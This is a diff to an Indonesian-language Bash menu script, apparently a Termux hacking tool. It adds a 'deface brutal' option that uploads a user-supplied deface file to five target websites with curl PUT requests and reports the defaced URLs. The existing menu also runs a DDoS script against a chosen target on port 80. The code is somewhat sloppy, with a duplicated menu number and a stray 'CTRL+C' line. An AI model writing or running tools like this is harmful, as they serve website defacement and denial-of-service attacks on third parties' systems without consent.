@@ -28,7 +28,9 @@ echo "LIST" | lolcat
 echo   "[=][===================================][=]" | lolcat
 echo "[1]. CEK IP WEBSITE " | lolcat
 echo "[2]. DDOS " | lolcat
-echo "[2]. " | lolcat
+echo "[3]. DEFACE BRUTAL" | lolcat
+echo "[4]. EXIT" | lolcat
+
 echo $white"---------------------------------------"
 
 echo "╭─[=]B3T4[=]" Masukan Piliha  Anda |lolcat
@@ -39,7 +41,8 @@ if
 [ $fcm = 1 ] || [ $fcm = 1 ]
 then
 clear
-toilet -f slant " CEK IP WEBSITE " |lolcat
+toilet -f slant " CEK IP " |lolcat
+toilet -f slant "  WEBSTIE " |lolcat
 echo "╭─[=]B3T4[=]" Masukan Target anda |lolcat
 read -p "╰─#" target
 echo
@@ -57,4 +60,52 @@ read -p "╰─#" target
 clear
 echo
 python3 fcm.py -s $target -p 80 -t 135
+fi
+
+if 
+[ $fcm = 3 ] || [ $fcm = 3 ]
+then
+clear
+toilet -f slant " DEFACE BRUTAL " |lolcat
+echo $red"Nb:script deface nya agan taruh diluar folder di penyimpanan internal ya gan"
+echo    "╭─[=]B3T4[=]" Masukan Script anda |lolcat
+read -p "╰─#" script
+echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
+read -p "╰─#" target1
+echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
+read -p "╰─#" target2
+echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
+read -p "╰─#" target3
+echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
+read -p "╰─#" target4
+echo    "╭─[=]B3T4[=]" Masukan Target anda |lolcat
+read -p "╰─#" target5
+echo
+curl -T /storage/emulated/0/$script $target1
+curl -T /storage/emulated/0/$script $target2
+curl -T /storage/emulated/0/$script $target3
+curl -T /storage/emulated/0/$script $target4
+curl -T /storage/emulated/0/$script $target5
+echo $blue"Tunggu..."
+echo $green"Hasil deface =>$target1/$script"
+echo $green"Hasil deface =>$target2/$script"
+echo $green"Hasil deface =>$target3/$script"
+echo $green"Hasil deface =>$target4/$script"
+echo $green"Hasil deface =>$target5/$script"
+echo
+fi
+
+if 
+[ $fcm = 2 ] || [ $fcm = 2 ]
+then
+clear
+toilet -f slant " EXIT " |lolcat
+echo
+echo $blue"Terimakasih Telah Menggunakan tools ini"
+echo
+echo "╭─[=]B3T4[=]" YA/TIDAK |lolcat
+read -p "╰─#" exit
+echo
+exit
+CTRL+C
 fi
